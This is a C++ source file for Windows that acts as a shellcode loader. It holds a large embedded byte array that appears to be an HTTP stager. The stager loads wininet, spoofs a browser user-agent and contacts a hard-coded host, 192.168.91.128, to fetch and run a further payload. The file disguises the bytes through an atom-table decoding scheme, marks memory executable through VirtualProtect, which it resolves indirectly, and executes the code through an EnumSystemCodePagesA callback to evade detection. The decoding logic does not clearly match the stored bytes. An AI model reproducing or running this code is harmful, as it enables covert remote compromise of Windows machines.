#define _CRT_SECURE_NO_DEPRECATE
#include<Windows.h>
#include<iostream>
using namespace std;

typedef BOOL(WINAPI* VirTual)(
    LPVOID     Addr,
    DWORD      Size,
    DWORD      New,
    PDWORD     Old
    );

VirTual VT = (VirTual)GetProcAddress(
    GetModuleHandleA("Kernel32.dll"),
    "VirtualProtect"
);

void dec(char* name) {
    char buf[7000]="\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4d\x45\x5a\x71\x00\x71\x35\x5d\x88\xf5\xbc\x13\xc8\x64\x09\xa1\x14\x30\xca\xf2\xaf\x49\x10\x9a\x57\xd8\xd4\xdc\x48\xd1\x2b\xe0\x71\xc3\x0c\x1c\xc2\xc4\x62\xaa\xdc\xc9\x4f\xa3\x5c\x0d\x5c\x93\xea\x97\x97\xc2\x39\x2f\x8a\x91\xc4\x98\x1f\xf2\xc9\x83\xba\xe7\x52\x2c\xb7\x9c\xa1\xf8\xea\x71\xc8\x49\xbf\x01\x39\xe8\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x41\x55\x29\x0d\x0a\x00\x51\xee\xbd\xa8\x2e\xc2\x6b\xcf\x59\x1f\x65\x23\x74\xd4\x46\x7d\x7f\x18\x69\x83\xc0\xd6\xc8\xe9\xc4\x07\x00\x3d\xbc\x63\x02\xb6\x32\xf2\x63\x84\x14\xf5\xc0\xf5\x8e\xed\x4d\x76\xb5\xf7\x97\x7e\xc5\x2e\x07\xc3\xe1\xaf\x0a\x80\x22\x68\x78\x21\x7d\x27\x3e\xaf\xce\x1e\x57\x35\x96\x68\x71\x42\xb4\x21\xa7\x86\x86\x66\xd0\x9a\x76\xb7\xe2\xb1\xcc\x41\xd1\xbf\x92\xe7\x20\xe6\x30\x40\x18\x61\xbd\x52\x76\x72\x01\xe5\x5a\xad\x1b\x45\xa6\x8f\x2d\x46\xcf\xf9\x31\x29\x30\x80\xcd\xf1\xa8\xfe\xf2\x74\x33\x65\xa2\x5a\xef\x96\x21\x48\x24\xb8\x02\xb7\x89\x36\x93\x33\xb4\x63\x65\xd0\x2b\x41\x22\x20\x58\x39\xa8\x4f\xa1\x20\x0f\xf4\x4e\x84\xe7\xb1\xe8\x4c\x2a\xa8\x1f\x90\x16\x82\x83\xc8\x69\xb1\x84\x7b\x1e\x71\xdb\x09\x4c\x92\xc4\xbc\x4b\x32\x48\x97\x9f\x21\x04\xeb\x1b\x1c\xc9\xac\xb2\x23\x59\x23\x0d\x87\x60\xa7\xfd\xd0\x3c\x26\xe2\x87\xdd\x26\x89\x0e\x59\x3d\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x39\x31\x2e\x31\x32\x38\x00\x27\xbc\x86\xaa";
    strcat(buf, name);
    char bufff[50];
    char cd[50];
    int code;
    char buff[7000];
    string buf_2 = buf;
    int num = 0;
    int num_2 = num + 4;
    int code_num = 0;
    for (int i = 0; i < sizeof(buf); i++) {
        if (buf[i] != (char)'\x0') {
            string str = buf_2.substr(num, num_2);
            if (str.length() < 4) {
                break;
            }
            str.copy(cd, 4, 0);
            ATOM att = AddAtomA(cd);
            GetAtomNameA(att, bufff, 50);
            code = (atoi(bufff) - 1024) ^ 1024;
            buff[code_num] = (char)code;
            code_num++;
            num_2 += 4;
            num += 4;
        }
        else {
            break;
        }
    }
    DWORD old;
    VT(buff, sizeof(buff), PAGE_EXECUTE_READWRITE, &old);
    EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)&buff, CP_INSTALLED);
}

int main(int argc, char* argv[]) {

    char* name = argv[1];
    dec(name);
    return 0;
}